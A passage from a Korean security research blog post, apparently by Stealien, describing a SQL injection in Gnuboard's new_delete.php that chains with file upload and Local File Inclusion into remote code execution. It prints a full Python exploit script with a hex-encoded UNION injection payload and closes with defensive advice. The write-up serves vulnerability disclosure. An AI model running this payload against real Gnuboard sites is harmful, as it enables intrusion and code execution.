<p>이 후 select 된 데이터의 <code class="language-plaintext highlighter-rouge">wr_is_comment</code> 컬럼의 내용을 확인하여 각각의 코드를 실행하는데 이 때 해당 값이 0 과 같지 않을 경우 다음과 같은 코드를 실행한다.
<code class="language-plaintext highlighter-rouge">2차 query</code></p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">update</span> <span class="nv">$write_table</span> <span class="n">set</span> <span class="n">wr_comment</span> <span class="o">=</span> <span class="n">wr_comment</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">wr_last</span> <span class="o">=</span> <span class="s1">'{$row['</span><span class="n">wr_last</span><span class="s1">']}'</span> <span class="n">where</span> <span class="n">wr_id</span> <span class="o">=</span> <span class="s1">'{$write['</span><span class="n">wr_parent</span><span class="s1">']}'</span>
</code></pre></div></div>
<p>이 때 <code class="language-plaintext highlighter-rouge">$write</code> 변수에 저장되는 데이터의 값을 union 을 통해 적절히 조작하여 <code class="language-plaintext highlighter-rouge">update</code> 이후 부분을 자유롭게 조작할 수 있다.
 (그누보드는 파일 업로드 기능을 지원하고 실제 파일명을 <code class="language-plaintext highlighter-rouge">g5_board_file</code> 이라는 테이블에 저장하기 때문에 파일을 업로드 후 Local File Inclusion 취약점을 이용하여 Remote Code Execution이 가능)</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
# -*- coding: utf-8 -*-
</span><span class="kn">import</span> <span class="nn">requests</span>
<span class="n">cookie</span> <span class="o">=</span> <span class="s">'2a0d2363701f23f8a75028924a3af643=MTcyLjE2LjE1LjI1NA%3D%3D; PHPSESSID=atrem9p79ans05norgqsbqkpub; ck_font_resize_rmv_class=; ck_font_resize_add_class=; e1192aefb64683cc97abb83c71057733=dGVzdA%3D%3D'</span>
<span class="n">attack_url</span> <span class="o">=</span> <span class="s">'172.16.15.254:1234/gnu/'</span>
<span class="n">url</span> <span class="o">=</span> <span class="s">'http://'</span><span class="o">+</span> <span class="n">attack_url</span> <span class="o">+</span> <span class="s">'/bbs/new_delete.php'</span>
<span class="n">bo_table</span> <span class="o">=</span> <span class="s">'free as a inner join g5_board as b#'</span>
<span class="n">ex_board</span> <span class="o">=</span> <span class="s">'free'</span>
<span class="n">file_wr_id</span> <span class="o">=</span> <span class="s">'2'</span>
<span class="n">file_bo_table</span> <span class="o">=</span> <span class="s">'free'</span>
<span class="n">update</span> <span class="o">=</span> <span class="s">'0x'</span><span class="o">+</span><span class="s">'''
set b.bo_include_head=(select concat('../data/file/','{0}/',(select bf_file from g5_board_file where wr_id='{1}' and bo_table='{0}'))) where b.bo_table='{2}' -- -'''</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">file_bo_table</span><span class="p">,</span><span class="n">file_wr_id</span><span class="p">,</span><span class="n">ex_board</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">)</span>
<span class="k">print</span> <span class="n">update</span>
<span class="n">wr_id</span> <span class="o">=</span> <span class="s">'''
where 1=0 union/*asdfasdfsadfsadfsa*/select
1,2,3,{},5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135-- -'''</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">update</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">'sw'</span><span class="p">:</span><span class="s">'move'</span><span class="p">,</span>
        <span class="s">'pressed'</span> <span class="p">:</span> <span class="s">'선택내용삭제'</span><span class="p">,</span>
        <span class="s">'chk_bn_id[]'</span> <span class="p">:</span> <span class="s">'0'</span><span class="p">,</span>
        <span class="s">'bo_table[]'</span> <span class="p">:</span> <span class="n">bo_table</span><span class="p">,</span>
        <span class="s">'wr_id[]'</span> <span class="p">:</span> <span class="n">wr_id</span><span class="p">}</span>
<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">'Cookie'</span> <span class="p">:</span> <span class="n">cookie</span><span class="p">}</span>
<span class="n">r1</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
<span class="k">print</span> <span class="n">r1</span><span class="p">.</span><span class="n">text</span>
</code></pre></div></div>
<h2 id="결론">결론</h2>
<ol>
  <li>보안 업데이트를 잘 하고, 개발자는 보안기법이 적용된 변수를 활용하자</li>
  <li>관리자 페이지에 취약점이 많다고 해서 결코 관리자 페이지에서만 취약점이 일어나지 않으니 주의를 기울이자</li>
</ol>

    <div class="page-profile-detail">
        <div class="page-profile-detail-info">
            <div>
                <img class="page-profile_image-detail" src="/assets/2021-02-08-Gnuboard-RCE/profile.jpg" />
            </div>
            <div style="position: relative; top: 12px;left: 10px;">
                <div class="page-profile-author">이예랑</div>
                <div class="page-profile-email">yllee@stealien.com</div>
            </div>
        </div>
    </div>
</div>

<div class="recent-post-area">
    <div class="posts container">
        <div class="h1-recent-post">RECENT POST</div>
            <div class="row">
    <div class="col-sm-2 col-md-2">
        <div class="profile">
            <img src="/assets/posts/thumbnails/20200619.jpg" class="profile_image" />
            <div class="profile_author">김도현</div>
        </div>
    </div>
    <div class="col">
        <a href="/2021-10-13/MikroTik-PostAuth-RCE">
            <div class="post-title">
                MikroTik Post-Auth execve() call.
            </div>
        </a>
        <div class="post-summary">MikroTik Post-Auth execve() call.</div>
        <div class="post-info">
            <span style="color: #545454" class="post-author-mobile">
                김도현
                <span style="color: #f5f5f5; margin: 2px">|</span>
            </span>
            Oct 13, 2021
            <span style="color: #f5f5f5; margin: 2px">|</span>
            <span>R&D</span>
        </div>
    </div>
</div><div class="row">
    <div class="col-sm-2 col-md-2">
        <div class="profile">
            <img src="/assets/2021-08-20-CVE-2020-26934/profile.png" class="profile_image" />
            <div class="profile_author">고기완</div>
        </div>
    </div>
    <div class="col">
        <a href="/2021-09-02/CVE-2020-26934-phpMyAdmin-Reflected-Cross-site-scripting">
            <div class="post-title">
                CVE-2020-26934 - phpMyAdmin Reflected Cross-site scripting
            </div>
        </a>
        <div class="post-summary">phpMyAdmin Reflected Cross-site scripting</div>
        <div class="post-info">
            <span style="color: #545454" class="post-author-mobile">
                고기완
                <span style="color: #f5f5f5; margin: 2px">|</span>
            </span>
            Sep 2, 2021
            <span style="color: #f5f5f5; margin: 2px">|</span>
            <span>R&D</span>
        </div>
    </div>
</div>
        </div>
    </div>
</div>
		</div>
	</section><footer>
  <div class="container" style="display: flex; justify-content: space-between;">
    <!-- <a href="#top">
      <img src="/assets/white_logo.png" class="footer-logo" />
    </a> -->
    <div class="footer-copyright">Copyright &copy; Stealien Inc.</div>
    <div class="footer-icons">
      <a target="_blank" href="https://twitter.com/stealien"><img src="/assets/icons/twitter_ic.png"/></a>
      <a target="_blank" href="https://blog.naver.com/stealien_official"><img src="/assets/icons/blog_ic.png"/></a>
      <a target="_blank" href="https://www.facebook.com/stealien/"><img src="/assets/icons/facebook_ic.png"/></a>
      <a target="_blank" href="https://www.youtube.com/c/STEALIEN"><img src="/assets/icons/youtube_ic.png"/></a>
    </div>
  </div>
</footer></body>
</html>
